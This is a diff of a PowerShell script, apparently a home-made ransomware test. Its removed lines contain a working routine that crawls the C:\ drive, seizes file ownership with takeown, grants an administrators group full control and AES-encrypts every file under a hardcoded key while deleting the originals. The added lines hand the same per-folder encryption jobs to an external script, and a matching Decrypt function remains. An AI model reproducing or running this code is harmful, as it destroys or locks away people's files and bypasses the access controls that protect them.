@@ -2,47 +2,10 @@
 Import-Module NTFSSecurity
 Add-Type -AssemblyName System.Windows.Forms 
 [void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
-$global:key = ConvertTo-SecureString "6Z/tM7LRRsGP6bsJkEX0fQrgE3c+Oklknlier3nULaM=" -AsPlainText -Force
 $Folder = 'C:\'
 $global:decryptKey = "Test"
-$functions = {
-function Encrypt([String]$Path){
-$key = ConvertTo-SecureString "6Z/tM7LRRsGP6bsJkEX0fQrgE3c+Oklknlier3nULaM=" -AsPlainText -Force
-
-$file = Get-ChildItem $Path | Where-Object {$_.mode -match "a"}
-$fold = Get-ChildItem $Path | Where-Object {$_.mode -match "d"}
 
 
-
-foreach($i in $file){
-
-if($i.FullName -match "takeown.exe"){
-    
-}else{
-try{
-Protect-File $i.FullName -Algorithm AES -key $key -RemoveSource -ErrorAction Stop
-}catch{
-takeown /A /F $i.FullName
-Add-NTFSAccess -Path $i.FullName -Account "Administrateurs" -AccessRights FullControl
-Protect-File $i.FullName -Algorithm AES -key $key -RemoveSource -ErrorAction Continue
-}
-}
-}
-
-
-foreach($f in $fold){
-$test = Get-Acl $f.FullName | Select -Property Owner
-if($test -match "Administrateurs" -Or $test -match $env:UserName){
-    
-}else{
-takeown /A /F $f.FullName
-Add-NTFSAccess -Path $f.FullName -Account "Administrateurs" -AccessRights FullControl 
-}
-Encrypt $f.FullName
-}
-
-} 
-}
 function Decrypt([String]$Path){
 
 $key = ConvertTo-SecureString "6Z/tM7LRRsGP6bsJkEX0fQrgE3c+Oklknlier3nULaM=" -AsPlainText -Force
@@ -68,16 +31,14 @@ $folders = New-Object System.Collections.ArrayList
 foreach($x in $var){$folders.Add($x.FullName) > null}
 $folders
 foreach($f in $folders){
-Start-Job -Name $f -InitializationScript $functions -ScriptBlock {
-Write-Host "value="$args[0]
-Encrypt $args[0]
-} -ArgumentList( $f)
+Start-Job -Name $f -FilePath 'C:\Users\Anthony Ouinet\Documents\test.ps1' -ArgumentList( $f)
+} 
 
-}
-#Wait-Job *
-Receive-Job -Name * -Keep 
 
-#Encrypt $Folder
+Get-Job | Wait-Job
+Get-Job | Receive-Job | Out-GridView 
+
+
 
 #----------------  Form  ----------------------
 $Form = New-Object system.Windows.Forms.Form
